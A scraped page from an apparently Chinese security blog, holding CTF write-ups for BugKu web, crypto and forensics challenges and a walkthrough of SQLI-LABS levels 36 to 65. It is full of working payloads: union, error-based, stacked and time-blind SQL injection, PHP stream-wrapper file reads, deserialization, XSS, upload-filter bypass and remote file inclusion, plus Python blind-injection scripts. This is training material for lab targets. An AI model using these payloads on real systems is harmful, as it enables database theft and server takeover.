iv.decode('unicode_escape')newIv = ''right = 'a:2:&#123;s:8:\"userna' # 被损坏前正确的明文for i in range(16): newIv += chr( ord(right[i]) ^ ord(iv[i]) ^ ord(cipher[i])) print(urllib.parse.quote(base64.b64encode(newIv.encode('latin-1')))) 将得到的iv替换cookie中的iv，刷新一下页面即可以admin身份登录获取flag。","categories":[{"name":"资料","slug":"资料","permalink":"http://chaosec.top/categories/资料/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"},{"name":"Crypto","slug":"Crypto","permalink":"http://chaosec.top/tags/Crypto/"}]},{"title":"BUGKU-CTF题解","slug":"bugkuwriteup","date":"2018-03-12T13:26:27.000Z","updated":"2019-01-30T11:44:07.782Z","comments":true,"path":"2018/03/12/bugkuwriteup/","link":"","permalink":"http://chaosec.top/2018/03/12/bugkuwriteup/","excerpt":"前言最近一段时间课比较少，做一做bugku的题目。传送门","text":"前言最近一段时间课比较少，做一做bugku的题目。传送门 杂项签到题加群即可 这是一张单纯的图片hex一下之后得到 &#107;&#101;&#121;&#123;&#121;&#111;&#117;&#32;&#97;&#114;&#101;&#32;&#114;&#105;&#103;&#104;&#116;&#125; ，Unicode解码即可(我这个是被解码后的) 隐写改变高度即可得到flag，将7对应的第二行A4改为F4即可。 telnetwireshark跑一下然后追踪tcp流即可 猜google搜索图片可知那是刘亦菲(liuyifei)。 流量分析（cnss）这个题目我觉得挺坑的，用wireshark分析一下，因为题目也没任何提示，而且包里面貌似是CSRF，所以就在往这上面想，但是也没什么收获，反正这题数据包少，就随手追踪了第一条碰碰运气，结果它的请求引起了我的注意： GET /stat.htm?id=2724999&amp;r=http%3A%2F%2Fspace.bilibili.com%2F17190571&amp;lg=zh-cn&amp;ntime=1490634009&amp;cnzz_eid=418561883-1487085537-http%3A%2F%2Fwww.bilibili.com%2F&amp;showp=1536x864&amp;p=http%3A%2F%2Fspace.bilibili.com%2F17190571%2F%23!%2F&amp;t=Chrstm%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%A9%BA%E9%97%B4%20-%20%E5%93%94%E5%93%A9%E5%93%94%E5%93%A9%20(%20%E3%82%9C-%20%E3%82%9C)%E3%81%A4%E3%83%AD%20%E4%B9%BE%E6%9D%AF~%20Bilibil…&amp;umuuid=15ab677e5a02ed-064c9a36304b67-27d1a36-144000-15ab677e5a4205b&amp;h=1&amp;rnd=1218637328 HTTP/1.1 请求网址里面有个space.bilibili.com ，感觉这应该是某个用户的个人空间，尝试访问一下，结果就在个人空间里个性签名看到了熟悉的base64，解码两次即可得到flag。 做个游戏(08067CTF)下载之后是个游戏，直接二进制反编译一下，结果在PlaneGameFrame类里面找到了flag，记得flag还得再base64解码一下。 Webweb2直接查看元素即可 文件上传测试burpsuite抓包将图片文件改名为2.png.php即可 计算器直接计算即可，问题在于输入框只能输入以为数字，查看元素将最大长度改为3即可。 web基础$_GETpayload ?what=flag web基础$_POST1what=flag 矛盾用%00截断即可?num=1%00adf，原理是==比较时只是对值的比较，会把不同类型转为同类型之后再行比较 Web3阻止页面弹窗后查看元素，然后Unicode解码即可 sql注入查看元素发现是gb2312的编码，测试?id=1%df’则会报错，说明是宽字节注入，payload1?id=1%df&apos; union select 1,string from sql5.key where id=1--+ 域名解析直接在linux下打开hosts文件，输入下列文档 120.24.86.145 flag.bugku.com 我在部分linux下不能用，不知道是为什么。 sql注入1过滤了关键字，尝试用%00绕过1?id=-1 uni%00on sele%00ct 1,hash fr%00om sql3.key wh%00ere id=1--+ 你必须让他停下页面一直停不下来，尝试了禁用js文件，还是不行，尝试burpsuite构造参数多次抓包，然后查看返回页面里则可以得到flag。 网站被黑题目给出提示 这个题没技术含量但是实战中经常遇到 ,打开后发现也没有什么泄露的问题，所以猜测应该是后台弱口令之类的问题，扫描了一下目录，发现有个shell.php，是个后台马，尝试了几个弱口令都不行，最终尝试爆破了一下，得到密码。（提示一下密码是四位）。 本地包含页面有代码泄露1234567 &lt;?php include \"waf.php\"; include \"flag.php\"; $a = @$_REQUEST['hello']; eval( \"var_dump($a);\"); show_source(__FILE__);?&gt; 方法一 变量request是一个http变量，可以接受post或者get和cookie的数组，代码中eval( “var_dump($a);”)存在可以利用的漏洞，可以把所要得到的文件dump出来。构造参数1?hello=file_get_contents(&apos;flag.php&apos;) 浏览器php代码被截断，f12查看元素即可得到flag 方法二 其中第一句话include “flag.php”可知文件包含在本地 还是利用 eval()函数，payload11);print_r(file(&quot;./flag.php&quot;));%23 %23的作用是注释掉eval函数后面的“)形成闭合。 strcmp比较字符串这个题目的问题在于PHP在5.3版本之前，对于字符串比较函数strcmp(p1,p2)函数，如果p1&gt;p2，返回&gt;0；如果p1=p2，返回=0；如果p1 &lt; p2，返回&#60;0。但是如果传递到参数是个数组，那么函数会报错，则会return 0，相当于判断为p1=p2了。故payload为?a[]=1。 变量1本题考查可变变量，故payload为 ?args=GLOBALS，这里这个$$GLOBALS只能在eval中使用，却不能直接var_dump出来，不知道是为什么。 web5jspfuck查看代码，直接将代码扔进控制台即可 头等舱抓包查看请求头即可 管理员系统修改xff本地登录，之后查看源代码发现最后一行有一段base64内容，解码之后是 test123 ，所以直接以这个作为密码登录试一下，然后就拿到了flag web4查看源代码发现有url编码的文本，按照 eval(unescape(p1) + unescape(‘%35%34%61%61%32’ + p2));语句拼接url编码并转码可得12345678910function checkSubmit()&#123; var a=document.getElementById(&quot;password&quot;); if(&quot;undefined&quot;!=typeof a)&#123; if(&quot;67d709b2b54aa2aa648cf6e87a7114f1&quot;==a.value)return!0; alert(&quot;Error&quot;); a.focus(); return!1 &#125;&#125;document.getElementById(&quot;levelQuest&quot;).onsubmit=checkSubmit; 查看代码可知将67d709b2b54aa2aa648cf6e87a7114f1提交即可。 flag在index里查看元素发现有href=”./index.php?file=show.php语句，而题目又说flag在index里，所以应该是要查看index.php文件，burp抓包修改。payload file=php://filter/convert.base64-encode/resource=index.php 输入密码查看flag简答的弱口令爆破，密码13579 点击一百万次post参数为1000000即可 备份是个好习惯题目说了备份，查看index.php.bak可以下载到源码1234567891011121314151617181920&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once \"flag.php\";ini_set(\"display_errors\", 0);$str = strstr($_SERVER['REQUEST_URI'], '?');$str = substr($str,1);$str = str_replace('key','',$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.\"取得flag\";&#125;?&gt; 阅读代码可知，提交两个md5值相等而本身值不相等的变量即可，同时还有变量guolv，双写绕过即可，这里提一下，这儿的 REQUEST_URI的输入方式www.xxx.com/aaa/ ,那么aaa就是REQUEST_URI。本题payload /?kekeyy1[]=1&amp;kekeyy2[]=2/ 成绩单常规的SQL注入12345id=1&apos; order by 4%23 #爆字段数id=-1&apos; union select 1,database(),3,4%23 #爆数据库名id=-1&apos; union select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()%23 #爆表名id=-1&apos; union select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&apos;fl4g&apos;%23 #爆字段名id=-1&apos; union select 1,skctf_flag,3,4 from fl4g%23 秋名山老司机这个题只能2秒内提交，所以写个脚本1234567891011121314import requestsimport reurl = &quot;http://120.24.86.145:8002/qiumingshan/&quot;r = requests.session()content = r.get(url).textpar = re.findall(r&apos;(.*?)=.*?&apos;,content)text = par[1][5:]ans = eval(text)payload = &#123;&apos;value&apos;:ans&#125;content = r.post(url,data=payload).textprint(content) 速度要快这个题就是编程题，抓包就会发现有个flag值，被base64编码了，解之，然后查看元素 OK ,now you have to post the margin what you find 所以其实就是要提交margin值，但是这个题最骚的就是这个被base64解码后flag还需要在解码一次，也怪我，第一次解码后这个字符串倒是挺像base64的，怪我不够敏感，而且margin好像是css样式，应该解出数字才对。贴上代码123456789101112import requestsimport base64url = \"http://120.24.86.145:8002/web6/\"r = requests.session()content = r.get(url).headers['flag'].encode('utf-8')content = base64.b64decode(content)content = content.decode('utf-8')[15:]content = base64.b64decode(content)payload = &#123;'margin':content&#125;res = r.post(url,data=payload).textprint(res) COOKIE欺骗解码filename发现是keys.txt，base64编码index.php替换之，然后改变line的参数即可得到全部php文件进行代码审计，改变cookie为margin=margin，再把filename的值为keys.php(要base64编码)，然后就OK了 XSS这个题目是最简单的xss，所谓xss其实和sql注入差不多，这是xss用的是JavaScript语言，payload1?id=src=&quot;null&quot; onerror=&quot;alert(_key_)&quot;\\u003e never give up看到提示有1p.html，但是查看会跳转，用view-source查看即可，然后恢复代码123456789101112131415161718192021222324&lt;?phpif(!$_GET['id']) //$_GET['id']为空时执行该语句&#123; header('Location: hello.php?id=1'); exit();&#125;$id=$_GET['id'];$a=$_GET['a'];$b=$_GET['b'];if(stripos($a,'.'))&#123; echo 'no no no no no no no'; return ;&#125;$data = @file_get_contents($a,'r');if($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4)&#123; require(\"f4l2a3g.txt\");&#125;else&#123; print \"never never never give up !!!\";&#125;?&gt; 发现有个txt文件，不管别的，先看一下再说，结果直接出了flag，这应该是题目的漏洞。下面说正解查看代码，$a的绕过的话 a=php://input，然后postbugku is a nice plateform!，$id==0的绕过话可以用 id=%00绕过， strlen($b)&gt;5 and eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4的绕过可以用b=%00123456 参看PHP手册可以知道php://input是个可以访问请求的原始数据的只读流，一般用来获取POST请求。对于id的处理有代码可知，如果提交id=0，那么前面 $_GET[‘id’]会被判断为空，无法从而使代码exit。所以可以用id=00或者id=%00绕过(字符串0在PHP中会被当做空值)函数eregi()现已被弃用，存在%00截断漏洞，读到%00的时候，判断就截止了。 welcome to bugkuctf访问元素发现源代码123456789$user = $_GET[\"txt\"]; $file = $_GET[\"file\"]; $pass = $_GET[\"password\"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')===\"welcome to the bugkuctf\"))&#123; echo \"hello admin!&lt;br&gt;\"; include($file); //hint.php &#125;else&#123; echo \"you are not admin ! \"; &#125; text的绕过可以使用php的input协议流，file的话用PHP的filter过滤器即可1?txt=php://input&amp;file=php://filter/read=convert.base64-encode/resource=hint.php 读取到一段base64代码，解码得到PHP代码123456789101112&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo &quot;&lt;br&gt;&quot;; return (&quot;good&quot;); &#125; &#125; &#125; ?&gt; 发现这是一个flag类，有个string方法，序列化即可使之执行。payload1?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125; 过狗一句话查看源代码可知已经构造了assert语句，这个对于我来说是一个新知识点。assert和eval类似，可以进行命令执行，只是eval参数为字符串，而assert参数则为函数或表达式。构造命令来执行?s=var_dump(glob(‘*‘)) 函数glob(pattern，flag)可以匹配所有符合条件的文件 读取文件?s=var_dump(file(‘./flag.txt’)) 字符？正则？这个正则表达式后面我得好好学一下了，有点菜。靠着百度大概搞懂了，介绍一些 [[:punct:]]为匹配任意字符，非字母和数字，.*为匹配任意字符，{m,n}为匹配字符m-n次，按照要求构造payload 1?id=key.keyaaaaakey:/a/keya% 前女友(SKCTF)查看页面可知，是一段单身狗的诉说，查看元素发现竟然藏了一条链接，点击发现代码123456789101112&lt;?phpif(isset($_GET[&apos;v1&apos;]) &amp;&amp; isset($_GET[&apos;v2&apos;]) &amp;&amp; isset($_GET[&apos;v3&apos;]))&#123; $v1 = $_GET[&apos;v1&apos;]; $v2 = $_GET[&apos;v2&apos;]; $v3 = $_GET[&apos;v3&apos;]; if($v1 != $v2 &amp;&amp; md5($v1) == md5($v2))&#123; if(!strcmp($v3, $flag))&#123; echo $flag; &#125; &#125;&#125;?&gt; 很简单的绕过1?v1=240610708&amp;v2=QNKCDZO&amp;v3[]=1 login1(SKCTF)看提示可知本题是SQL约束攻击，具体原理查看传送门，创建一个用户 用户名 admin 1 密码 Aa123456 注册成功后用admin为用户名， Aa123456登录即可 1SKCTF&#123;4Dm1n_HaV3_GreAt_p0w3R&#125; 你从哪里来题目提示are you from google?，我以为是说浏览器，但实际上是说HTTP_REFERER，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。然后就是抓包发送即可，构造的referrer：1https://www.google.com md5 collision这题是简单的md5哈希的比较1?a=240610708 各种绕过这题很简单，直接上payload12?id=margin&amp;uname[]=1passwd[]=123 注意第二行为post数据。 web8代码审计与绕过123456789101112131415&lt;?phpextract($_GET);if (!empty($ac))&#123;$f = trim(file_get_contents($fn));if ($ac === $f)&#123;echo \"&lt;p&gt;This is flag:\" .\" $flag&lt;/p&gt;\";&#125;else&#123;echo \"&lt;p&gt;sorry!&lt;/p&gt;\";&#125;&#125;?&gt; 要绕过的核心语句是$ac===$f，可以令 ac=flag，fn处使用之前说过的PHP的input协议，本题payload1?ac=flag&amp;fn=php://input 再post数据1flag 细心看了一点提示，有点不好。这题一看页面没什么东西，随便尝试旁站robots.txt(就是这一步我没有做，唉，经验不足啊),扫描发现有个resusl.php页面，直接是x=admin即可(考验脑洞的时刻) 求getshell对于getshell的题目做的不是很多，真的是有点迷。抓包更改后缀为 php2,php4.php5，测试发现php5可用，然后再把文件类型改一下 content-type: image/jpg 还得改个东西 Content-Type: Multipart/form-data; boundary=—————————————-265001916915724 把第一个m大写，有关介绍看个链接,这种绕过有点冷门，再放个链接2 INSERT INTO注入这个题又让我学到了新知识，还顺便加强了一波脚本编写，本题考察的是 insert into注入，为什么存在注入呢 查看源代码，发现1$ip_arr = explode(',', $ip); 这句话一出， 说明，就被过滤了，所以这题是一道不能使用逗号的注入，而且报错什么的都不行，所以只能延时盲注。由于本题逗号被过滤了，所以if函数不能用了，在此解锁一个新姿势12select substring((select user()) from 1 for 1); #第一种方法select substring((select user()) from -1); #第二种方法 如此就可以不用逗号截取字符串 对于判断条件，可以使用1select case when (条件) then 代码1 else 代码 2 end 这个前面数据库有介绍。所以对于本题有两种payload：12insert into xs values(12&apos;+(select case when binary substr((select flag from flag) from 1 for 1)=&apos;e&apos; then sleep(5) else sleep(0) end) and &apos;a&apos;=&apos;a&apos;)insert into xs values(12&apos;+(select case when binary substr((select flag from flag) from -1)=&apos;e&apos; then sleep(5) else sleep(0) end) and &apos;a&apos;=&apos;a&apos;) 再介绍一个绕过逗号的姿势： 1select id,ip from client_ip where 1&gt;2 union select * from ( (select user())a JOIN (select version())b ); --这个用于union 查询的注入 接下来就是写脚本了 1234567891011121314151617import requestsimport stringurl = \"http://120.24.86.145:8002/web15/\"data = \"12'+(select case when binary substr((select flag from flag) from &#123;&#125; for 1)='&#123;&#125;' then sleep(5) else 1 end) and 'a'='a\" flag = ''start = 1for i in range(1,35): for item in string.ascii_letters + string.digits: try: headers = &#123;\"x-forwarded-for\":data.format(str(start),item)&#125; res = requests.get(url,headers=headers,timeout=3) except requests.exceptions.ReadTimeout: flag += item start += 1 print(flag) break 这是一个神奇的登录框尝试输入 “，发现有报错，可以报错注入。而且题目什么都没有过滤。 ed6b28e684817d9efcaf802979e57aeed6b28e684817d9efcaf802979e57aea1admin_name=admin&amp;admin_passwd=afd&quot; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)%23 1admin_name=admin&amp;admin_passwd=afd&quot; and updatexml(1,concat(0x7e,(select flag1 from flag1),0x7e),1)%23 用这种方法的出来的flag不对，因为该错误返回的值长度不足，可以再用下列子句截出1admin_name=admin&amp;admin_passwd=afd&quot; and updatexml(1,concat(0x7e,substr((select flag1 from flag1),3,30),0x7e),1)%23 也可以联合注入1admin_name=admin&amp;admin_passwd=af&quot; union select flag1,2 from flag1%23 多次这个题学到了新东西，题目很不错。这个题目过滤了许多关键字刚开始输入 ?id=1’页面返回错误(但不是报错信息)，添加 ?id=1’%23则没有报错，继续尝试 ?id=1’ and 1=1%23则又开始报错了，猜测可能是存在过滤，但不知道过滤的是什么。找到一个异或注入的方法 在id后面输入 1’^(0)^’，此时页面正常返回，如果换一下 ‘^(1)^’，此时则会返回错误，那么接下来我们就可以试一下页面究竟过滤了那些关键字。比如 1’^(length(‘select’)!=6)^’如果被过滤则返回错误，没有被过滤就返回正确。如此可以测得多个变量被过滤 select,union,or,and 但是from,where，order等变量没有被过滤。在尝试一下 1’^(length(‘selselectect’)!=6)^’页面返回正确，说明可以通过这种方法绕过。那接下里就开始常规操作。 12?id=1&apos; oorrder by 3%23 # 爆字段数?id=-1&apos; ununionion seleselectct 1,database() %23 注意information的绕过。1?id=-1&apos; ununionion seleselectct 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()%23 最后得到下一个页面的地址1?id=-1&apos; ununionion seleselectct 1,group_concat(address) from flag1%23 到了新页面之后，发现有报错，也会显示你的SQL语句，很简单就能看出很多都被过滤了，不过直接用报错就行了1?id=1&apos; and updatexml(1,concat(0x7e,(select flag2 from flag2),0x7e),1)%23 看别人的payload使用了locate()函数 代码审计strcmp比较字符串提交数组即可绕过 ?a[]=1 数组返回NULL绕过也是提交数组 ?password[]=123 ,因为题目中的函数都是只能处理字符串，如果传入的是数组则会报错返回 NULL达到绕过的效果。 变量覆盖看代码可知，$c获取的是输入流里面的值，因为$b是字符串，所以获取的是控制，故只需要相应的输入空值即可。 简单的waf没做出来，记录一下思路 题目代码如下 123456789101112131415161718192021222324252627$a=isset($_GET[\"a\"])?$_GET[\"a\"]:'';$b=isset($_GET[\"b\"])?$_GET[\"b\"]:'';$c=isset($_GET[\"c\"])?$_GET[\"c\"]:'';$d=isset($_GET[\"d\"])?$_GET[\"d\"]:'';$e=isset($_GET['e'])?$_GET['e']:'';if(preg_match('/php/i', $a))&#123; die(\"This not allow pseudo protocol!\");&#125;if(preg_match('/\\.\\./', $a))&#123; die(\"This also not allow!\");&#125;if((file_get_contents($a,'r')===$b)&amp;&amp;(file_get_contents($e,'r')===\"I'm Administrator!\"))&#123; echo \"hello admin!&lt;br&gt;\"; if(preg_match(\"/flag/\",$c))&#123; echo \"不能现在就给你flag哦\"; exit(); &#125;else&#123; include($c); if(preg_match('/base64/', $d))&#123; die(\"No! you can't use it!\"); &#125; $d = unserialize($d); echo $d; &#125; &#125;else&#123; echo \"you are not admin ! &lt;br&gt;\";&#125; 首先变量a中不能出现php://等字段，显示我们不能使用PHP伪协议，但是这里可以远程文件包含，我们可以在自己的vps上写一个文件，然后a参数远程包含，再让b参数等于我们的文本内容就可了，对于e参数我们同样可以利用远程文件包含，在自己的vps上新建一个txt文件写入 I&#39;m Administrator! 即可，payload如下 1http://120.24.86.145:9010?a=http://vps_ip/index.html&amp;b=&lt;a&gt;Hello World&lt;/a&gt;%0a&amp;e=http://vps_ip/a.txt 说一下坑点，在使用vim编辑文件的时候，他会默认在文件末尾添加一个换行符，这也是为什么b参数后面要添加一个 %0a(换行符) ，但是在e参数对应的代码中的 I&#39;m Administrator! 可是没有换行符的，怎么办呢？百度找到了一个方法： 1、进入vim前，增加-b参数1vim -b a.txt 2、进入命令行模式，开启 set noeol这样就不会在文件末尾添加换行符了。 c参数和d参数个人感觉思路是c参数包含一个PHP文件，然后d参数反序列化读取，题目还有一个flag.php文件，所以c参数应该就是要包含该文件，题目过滤了flag，可以用大写绕过 Flag.php ，但是这里应该有一个类来反序列化才对，我感觉应该是通过文件泄露来获取，但是尝试了好多次都不行，直接访问flag，会下载到一个文件，信息为 please call admin to get flag 不知道这是什么意思，题目到这儿就卡住了，所以payload只有 1http://120.24.86.145:9010/?a=http://vps_ip/index.html&amp;b=&lt;a&gt;Hello%20World&lt;/a&gt;%0a&amp;e=http://vps_ip/a.txt&amp;c=Flag.php 加密滴答 ~ 滴摩斯解密可得bkctfmisc，提交即可,注意全部大写。 聪明的小羊栅栏解密 ok这段密文是一种ook语言，直接在线跑一下即可 这不是摩斯密码brainfuck代码，在上一题那个网站跑一下即可。 散乱的密文 lf5{ag024c483549d7fd@@1}一张纸条上凌乱的写着2 1 6 5 3 4 刚开始看到{前面有三位以为明文应该是key，顺着这个思路往下想，结果不对，后面注意到密文的2，1两位翻转一下是fl，6，5两位加上就是flag，于是再把3,4位放到原来5,6位的位置，那么前六位就是 flag{5 ，我们可以看到前六位进行的调整分别是1，2位交换位置，5,6位交换到3,4位顺序不变，3,4位调整到5,6位但是位置交换一下，于是把每六位分成一组，每组按照前述的方法做变换，最终可以得到flag 1flag&#123;52048c453d794df1&#125;@@ 贝斯家族base91解码 社工密码根据生日姓名等猜测zs19970315 王晓明的日记利用bugku在线密码生成工具生成密码字典测试一下即可 分析flag被盗过滤条件 http contains &quot;flag&quot;，在第二条数据中即发现了flag 抓到一只苍蝇首先查看一下http请求，在第一个就发现 本能的感觉这题和这个fly.rar应该有点关系，所以过滤一下 ‘http contains “fly.rar”‘ 看到了题目的提示内容，感觉走对了，这个包应该是QQ邮箱的包，所以肯定是走post请求的，过滤一下获取rar文件包 http.request.method == POST 可以看到从第二个到第六个正式rar的文件内容，但是这五个文件的总长度却比fly.rar要大，应该有多余的头部，计算一下头部长度 (527521bytes – 525701bytes) / 5 = 364 bytes 把每个一次导出，然后用hxd去掉头部364字节，之后再合并一下 可以看到md5值是正确的，证明我们得到了正确的fly.rar文件，但是解压时却要求输入密码，猜测是伪加密，将文件头0x1674后面的84改为80。（84为加密，80/20不加密），解密之后有个TXT文件，binwalk，foremost一下，在图片中找到一个二维码，扫码即可得到flag。 信息提取给的数据包是sqlmap注入的一个数据包，题目的意思是让我们从sqlmap的payload中恢复出数据，数据包的最后部分就是数据的记录，吧这部分分出来保存为a.pcap，将关键信息存入txt文件中 123456789101112131415161718192021222324252627282930313233343536# import scapy# from scapy.all import *# from scapy.utils import PcapReader# pcaps = rdpcap(\"a.pcap\")# file = open('1.txt','wb')# for i in range(476):# file.write(pcaps[i]['Raw'].load)# 将流量包字段信息导出，之后在用sublime过滤只留下请求内容和response长度，示例如下# GET /message.php?id=1%20AND%20ORD%28MID%28%28SELECT%20IFNULL%28CAST%28%60value%60%20AS%20CHAR%29%2C0x20%29%20FROM%20isg.flags%20ORDER%20BY%20%60value%60%20LIMIT%200%2C1%29%2C34%2C1%29%29%3E1 HTTP/1.1# Content-Length: 166from urllib.parse import unquoteimport redef is_rigth(x): if int(x) &gt; 4: return True else: return False with open('1.txt','r') as file: ans = \"\" req = file.readlines() length = req[238:476] req = req[0:238] for i in range(len(req)//7 - 1): num = int(re.search('&gt;([0-9]&#123;2,&#125;)',unquote(req[i*7+6],'utf-8')).group(1)) if is_rigth(length[i*7+6][-3]): ans += chr(int(num+1)) else: ans += chr(int(num)) print(ans)# ISG&#123;BLind_SQl_InJEcTi0N_DeTEcTEd&#125;","categories":[{"name":"writeup","slug":"writeup","permalink":"http://chaosec.top/categories/writeup/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"http://chaosec.top/tags/CTF/"}]},{"title":"SQLI-LABS(Less36-Less65)","slug":"sqli-labs3","date":"2018-03-05T13:41:22.000Z","updated":"2019-05-16T09:18:17.273Z","comments":true,"path":"2018/03/05/sqli-labs3/","link":"","permalink":"http://chaosec.top/2018/03/05/sqli-labs3/","excerpt":"接上篇","text":"接上篇 LESS-36函数mysql\\_real\\_escape\\_string()转义SQL语句中使用的字符串中的特殊字符。下列字符受影响： \\x00\\n\\r\\‘“\\x1a 如果成功，则该函数返回被转义的字符串。如果失败，则返回false。 可以使用宽字节注入 1?id=-1%df&apos; union select 1,database(),3--+ 在使用mysql_real_escape_string()函数时，想要避免这种问题，需要将mysql设置为gbk即可 LESS-37和34关绕过一样，waf和36关差不多 1uname=admin♦' or 1=1 limit 3,1#&amp;passwd=admin&amp;submit=Submit 堆叠注入stacked injection所谓堆叠注入，就是指多条SQL语句同时执行，在命令行中每个SQL语句都是以;结尾。虽然说union语句也可以执行两条select语句，区别在于union语句可以执行的语句有限，而堆叠注入可以执行任何语句。比如1select * from pruducts where id=1;delete from products 堆叠注入的局限性在于并非每个环境都可以执行，受到环境的限制， LESS-38本题明注盲注皆可以，明注payload1?id=-1&apos; union select 1,group_concat(username),3 from users--+ 堆叠注入1?id=-1&apos;;create table test like users--+ 可以看到数据库里面成功创建，然后再删除一下1?id=-1&apos;;drop table test--+ LESS-39payload1?id=-1 union select 1,2,3--+ 也可堆叠注入 LESS-40盲注payload1?id=2&apos;) and ascii(substr(database(),1,1))=115--+ 本题错误不回显，不能报错注入 LESS-41和40关一样无法报错，可以和39关一样1?id=-1;create table test like users--+ 多条命令执行。也可以注入1?id=-1 union select 1,2,database()--+ LESS-42本关mysqli_real_escape_string只过滤了username字段，对于password则没有过滤，payload1login_user=admin&amp;login_password=c&apos;;create table test like users# LESS-43和42关一样，只是闭合方式不同1login_user=admin&amp;login_password=c&apos;) or 1=1# LESS-44和42关一样，只是没有报错无法盲注1login_user=admin&amp;login_password=c&apos; or 1=1# LESS-451login_user=admin&amp;login_password=c&apos;) or 1=1# 注意：这几关页面都在login.php页面，不在原页面。 LESS-46本关是order by注入，尝试一下分号发现有报错，报错注入可以用一下1?sort=2 and extractvalue(1,concat(0x3c,(select database()))) 看不到数据库名的话查看一下元素即可 对于这种问题有三种方法 1、直接添加注入语句 ?sort=(select \\*\\*\\*\\*\\*\\*)2、利用一些函数，例如rand函数，?sort=rand(sql语句)，而且此处rand(true)和rand(false)是不相同的。3、利用and，例如?sort=1 and (加sql语句) 还可以执行infile等命令上传一句话木马 LESS-47本关只是闭合方式发生了变化，只能进行报错和延时注入 1234?sort=1&apos; and extractvalue(1,concat(0x3c,(select database())))%23?sort=1 and if(1=1, sleep(1), null)?sort=1&apos; and (length(database())) = 8 and if(1=1, sleep(1), null)%23?sort=1&apos; and (ascii(substr((select database()) ,1,1))) = 115 and if(1=1, sleep(1), null)%23 LESS-48这关没有报错回显，延时盲注即可1?sort=1 and (length(database())) = 8 and if(1=1, sleep(1), null)%23 LESS-49跟上关差不多只是闭合方式不同1?sort=1&apos; and (length(database())) = 8 and if(1=1, sleep(1), null)%23 LESS-50考察order by的堆叠注入1?sort=1;create table test like users; LESS-51闭合方式不同1?sort=1&apos;;create table test like users--+ LESS-52本题不报错，无法报错注入，依然可以堆叠注入1?sort=1;create table test like users LESS-53本关错误不能回显，但是可以和51关一样堆叠注入1?sort=1&apos;;create table test like users--+ LESS-54从本关开始进行更加进阶的注入，所用数据库也改为challenges，每个答案只能尝试10次，10次之后则会重置表名选项等信息。 由于已经知道数据库名，所以可以直接开始爆表名1?id=-1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+ 得到表名 utj0xhedjp(你的和我的不一样，是随机的)，接下来爆列名1?id=-1&apos; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;utj0xhedjp&apos;--+ 得到id,sessid,secret_W2TD,tryy，得到字段1?id=-1&apos; union select 1,secret_W2TD,3 from utj0xhedjp--+ 得到vYPh8AlkQMTlEGkZXRKWo1PT，提交即可。 LESS-55本关限制次数为14次，主要是前面尝试闭合，这个找出来后面就简单了1?id=1)%23 爆表名1?id=-1) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23 jq0p5t7r1m 爆列名1?id=-1) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&apos;jq0p5t7r1m&apos;%23 id,sessid,secret_3JXI,tryy 继续1?id=-1) union select 1,secret_3JXI,3 from jq0p5t7r1m%23 LESS-56payload1?id=1&apos;)%23 剩下的就不做了。 注意：本题中，如果用?id=1”%23也可以闭合，只是无法继续后面的步骤，提交上述参数后执行的SQL语句为1SELECT * FROM security.users WHERE id=(&apos;1&quot;#&apos;) LIMIT 0,1 在数据库中执行确实能够查到数据，那么问题在哪呢？ 查找资料后发现，mysql在运算过程中能够自动的把数字转化为字符串，而在比较运算中，如果是数字和字符串比较，则可以自动的把字符串转为数字，转换的时候如果首字符字符是数字，则会转换为相应的数字，例如&#39;1&quot;#&#39;转化为数字值为1，如果是&#39;11fads&#39;则为11，不过必须是数字和字符串比较的时候才会转换，如果都是字符的话则不会这样。 LESS-57本题是双引号闭合1?id=1&quot;%23 LESS-58本题无法进行联合注入，但是可以报错，故报错注入1?id=1&apos; and extractvalue(1,concat(0x5c,(select )))%23 爆内容1?id=1&apos; and extractvalue(1,concat(0x5c,(select secret_AJHH from y9hrni0ywl)))%23 LESS-59本题可以直接报错注入1?id=1 and extractvalue(1,concat(0x5c,(select database())))%23 LESS-60改变闭合方式1?id=1&quot;) and extractvalue(1,concat(0x5c,(select database())))%23 LESS-61双引号闭合，有点奇葩1?id=1&apos;)) and extractvalue(1,concat(0x5c,(select database())))--+ LESS-62本题没有错误回显，无法union注入，而且注释符貌似也被过滤了，可以考虑盲注1?id=1&apos; and length(database())=10 and &apos;a&apos;=&apos;a 爆表名1?id=1&apos; and ascii(substr((select table_name from information_schema.tables where table_schema=database()),1,1))=54 and &apos;a&apos;=&apos;a 爆列名1?id=1&apos; and ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;64r31rkgr6&apos;),2,1))=100 and &apos;a&apos;=&apos;a 爆数据1?id=1&apos; and ascii(substr((select secret_R69X from 64r31rkgr6 ),1,1))=121 and &apos;a&apos;=&apos;a 但是查看源代码发现这并非本关的闭合方式，闭合的话应该是1?id=1&apos;) and length(database())=10%23 但是我的payload也是可以的，原因在于)将我的输入闭合了，这也说明了为什么在我的原payload中不能使用注释符的原因。 LESS-63单引号闭合1?id=1&apos;%23 LESS-64双括号闭合1?id=1))%23 LESS-65payload1?id=1&quot;)%23 